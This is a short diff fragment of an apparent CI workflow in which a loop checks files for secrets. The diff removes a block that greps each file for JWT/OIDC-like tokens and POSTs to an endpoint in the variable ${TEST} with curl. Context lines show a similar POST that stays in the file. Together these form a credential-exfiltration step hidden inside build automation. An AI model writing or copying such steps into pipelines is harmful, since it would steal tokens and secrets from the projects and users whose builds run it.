@@ -64,13 +64,6 @@ jobs:
                   --data-binary "$file"
               fi
       
-              # JWT/OIDC-like structure
-              if grep -qE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' "$file" 2>/dev/null; then
-                curl -s -o /dev/null -X POST "${TEST}" \
-                  -H "Content-Type: text/plain" \
-                  --data-binary "$file"
-              fi
-      
             done
           done
 
